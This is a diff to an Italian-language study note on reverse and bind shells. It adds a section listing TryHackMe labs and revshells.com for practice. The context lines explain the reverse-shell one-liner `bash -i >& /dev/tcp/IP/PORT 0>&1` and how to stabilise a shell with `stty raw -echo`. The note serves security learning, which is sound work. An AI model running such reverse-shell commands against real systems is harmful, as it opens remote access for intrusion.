@@ -3,7 +3,7 @@ tipo: concetto
 tag: [metodologia]
 fase: 2
 fonti: 6
-aggiornato: 2026-06-21
+aggiornato: 2026-07-02
 stato: maturo
 aliases: ["Reverse Shell e Bind Shell"]
 
@@ -150,6 +150,12 @@ Perché `stty raw -echo`: disattiva l'elaborazione locale dei tasti (Ctrl+C, eco
 2. **Perché stabilizzare una shell e cosa fa `stty raw -echo`?** Una shell `nc` non ha PTY → no job control, no tab/history, `Ctrl+C` la chiude, no `sudo`/`ssh`. Si ottiene un PTY (`python pty.spawn`) e si mette il **terminale locale** in raw mode con `stty raw -echo` per inoltrare i tasti grezzi (Ctrl+C compreso) al PTY remoto.
 3. **Cosa significa `bash -i >& /dev/tcp/IP/PORT 0>&1`?** `-i` interattiva; `/dev/tcp/...` apre un socket (feature bash); `>&` redirige stdout+stderr al socket; `0>&1` aggancia stdin allo stesso socket.
 4. **Quale singolo indicatore tradisce quasi sempre una reverse shell sul target?** Una relazione padre-figlio anomala: un processo server (web/db) che lancia un interprete di shell con una connessione di rete in uscita.
+
+## Lab
+
+- **[[TryHackMe]] — "What the Shell" (introtoshells)**: room dedicata che fa praticare reverse vs bind shell, listener con [[netcat]], payload per vari linguaggi e la stabilizzazione TTY passo passo.
+- **[[TryHackMe]] — "Vulnversity" e "Blue"**: applica una reverse shell reale — nella prima via upload su un web server, nella seconda via Meterpreter di [[Metasploit]].
+- **revshells.com + un tuo lab locale**: genera diversi payload (bash, python, PHP, PowerShell) e verifica quale funziona a seconda della shell disponibile sul target (bash vs dash, nc con/senza `-e`), esercitando anche la procedura `stty raw -echo`.
 
 ## Collegamenti
 
